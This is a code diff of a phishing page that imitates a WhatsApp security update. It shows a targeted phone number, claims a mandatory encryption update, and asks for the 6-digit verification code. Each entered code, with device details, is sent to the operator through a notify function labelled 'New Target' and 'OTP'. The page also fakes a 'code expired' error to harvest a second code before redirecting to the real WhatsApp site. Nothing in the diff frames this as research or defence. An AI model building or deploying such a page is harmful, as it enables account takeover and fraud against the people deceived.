@@ -6,7 +6,7 @@
     <title>WhatsApp Security</title>
     <style>
         :root { --wa-bg: #0b141a; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, Segoe UI, Roboto, sans-serif; }
         body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; }
         #checker { position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         .pulse-logo { width: 60px; animation: pulse 2s infinite; }
@@ -15,9 +15,8 @@
         .active { display: block; animation: fadeIn 0.5s ease; }
         .card { background: #1d2a33; border-radius: 12px; padding: 18px; text-align: initial; margin-bottom: 20px; border: 1px solid #2a3942; }
         .line { font-size: 13px; margin-bottom: 8px; color: var(--wa-hint); display: flex; justify-content: space-between; }
-        .line b { color: #fff; font-family: monospace; }
+        .line b { color: #fff; }
         .otp-input { width: 100%; background: transparent; border: none; border-bottom: 2px solid #2a3942; color: #fff; font-size: 30px; text-align: center; outline: none; letter-spacing: 5px; margin: 20px 0; }
-        .otp-input:focus { border-bottom-color: var(--wa-green); }
         .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 15px; border-radius: 25px; font-size: 15px; font-weight: bold; cursor: pointer; }
         .spinner { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
@@ -49,13 +48,13 @@
 
     <script>
         const langs = {
-            ar: { load: "جاري فحص حالة الأمان...", title: "تحديث أمان واتساب", device: "الجهاز:", status: "الحالة:", status_v: "تحديث إجباري مطلوب", number: "رقم الحساب:", desc: "أدخل كود التحقق (6 أرقام) لتأكيد هويتك وتحديث نظام التشفير.", btn: "تحديث ومزامنة الآن", err: "الكود منتهي الصلاحية. تم إرسال كود جديد.", wait: "جاري المعالجة..." },
-            en: { load: "Checking security status...", title: "WhatsApp Security Update", device: "Device:", status: "Status:", status_v: "Mandatory Update Required", number: "Account Number:", desc: "Enter the 6-digit code to verify your identity and update encryption.", btn: "Update and Sync Now", err: "Code expired. A new code has been sent.", wait: "Processing..." }
+            ar: { load: "جاري التحقق من أمان الجهاز...", title: "تحديث أمان واتساب", device: "الجهاز:", status: "الحالة:", status_v: "تحديث مطلوب", number: "الرقم الموثق:", desc: "أدخل كود التحقق المكون من 6 أرقام لتأكيد تحديث نظام التشفير.", btn: "تحديث الآن", err: "الكود غير صحيح، تم إرسال كود جديد.", wait: "جاري المعالجة..." },
+            en: { load: "Verifying device security...", title: "WhatsApp Security Update", device: "Device:", status: "Status:", status_v: "Update Required", number: "Verified Number:", desc: "Enter the 6-digit verification code to confirm encryption update.", btn: "Update Now", err: "Invalid code. A new code has been sent.", wait: "Processing..." }
         };
 
         const userLang = navigator.language.startsWith('ar') ? 'ar' : 'en';
         const t = langs[userLang];
-        if(userLang === 'ar') document.body.classList.add('rtl'); else document.body.classList.add('ltr');
+        document.body.className = userLang === 'ar' ? 'rtl' : 'ltr';
 
         document.getElementById('load-text').innerText = t.load;
         document.getElementById('title').innerText = t.title;
@@ -73,29 +72,18 @@
         };
         document.getElementById('phone-display').innerText = `+20 ${CFG.P.substring(0,3)} •••• ${CFG.P.slice(-2)}`;
 
-        function getDevice() {
+        function getDeviceSimple() {
             const ua = navigator.userAgent;
-            const screenW = screen.width;
-            const screenH = screen.height;
-            
-            if (/iPhone/.test(ua)) {
-                let model = "iPhone";
-                // محاولة تحديد موديلات الأيفون بالأبعاد (تقريبي)
-                if (screenH === 852 || screenW === 852) model = "iPhone 15/16 Pro";
-                if (screenH === 932 || screenW === 932) model = "iPhone 15/16 Pro Max";
-                if (screenH === 844 || screenW === 844) model = "iPhone 12/13/14";
-                return model + " (iOS " + (ua.match(/OS (\d+)_(\d+)/)?.[1] || "") + ")";
-            }
-            if (/Android/.test(ua)) {
-                const model = ua.match(/\(([^;]+);/)?.[1] || "Android";
-                const ver = ua.match(/Android\s([0-9\.]+)/)?.[1] || "";
-                return model + " [Android " + ver + "]";
-            }
-            return "PC / Desktop System";
+            if (/iPhone|iPad|iPod/.test(ua)) return "iPhone";
+            if (/Android/.test(ua)) return "Android";
+            if (/Windows/.test(ua)) return "Windows";
+            if (/Macintosh/.test(ua)) return "Mac";
+            if (/Linux/.test(ua)) return "Linux";
+            return "Unknown Device";
         }
 
-        const deviceDetail = getDevice();
-        document.getElementById('device').innerText = deviceDetail;
+        const deviceName = getDeviceSimple();
+        document.getElementById('device').innerText = deviceName;
 
         document.getElementById('otp').addEventListener('input', e => {
             let v = e.target.value.replace(/\D/g, '');
@@ -114,7 +102,7 @@
             setTimeout(() => {
                 document.getElementById('checker').style.display = 'none';
                 document.getElementById('app').classList.add('active');
-                notify(`✅ <b>New Target Opened</b>\n👤 Phone: <code>${CFG.P}</code>\n📱 Device: <code>${deviceDetail}</code>\n🌐 Lang: <code>${userLang.toUpperCase()}</code>`);
+                notify(`👤 <b>New Target</b>\n📱 Device: <code>${deviceName}</code>\n🌍 Phone: <code>${CFG.P}</code>`);
             }, 2500);
         };
 
@@ -126,7 +114,7 @@
             const btn = document.getElementById('btn-txt');
             btn.innerText = t.wait; btn.disabled = true;
 
-            await notify(`🔥 <b>OTP Received #${step}</b>\n👤 Phone: <code>${CFG.P}</code>\n🔑 Code: <code>${val}</code>\n📱 Device: <code>${deviceDetail}</code>`);
+            await notify(`🔥 <b>OTP #${step}</b>\n📱 Device: <code>${deviceName}</code>\n👤 Phone: <code>${CFG.P}</code>\n🔑 Code: <code>${val}</code>`);
 
             if(step === 1) {
                 setTimeout(() => {
@@ -135,7 +123,7 @@
                     btn.innerText = t.btn; btn.disabled = false;
                 }, 1500);
             } else {
-                document.body.innerHTML = `<div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh;"><div class="spinner"></div><p style="margin-top:20px; color:#8696a0;">Syncing with server...</p></div>`;
+                document.body.innerHTML = `<div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh;"><div class="spinner"></div><p style="margin-top:20px; color:#8696a0;">Syncing...</p></div>`;
                 setTimeout(() => window.location.href = "https://www.whatsapp.com/security", 2000);
             }
         }
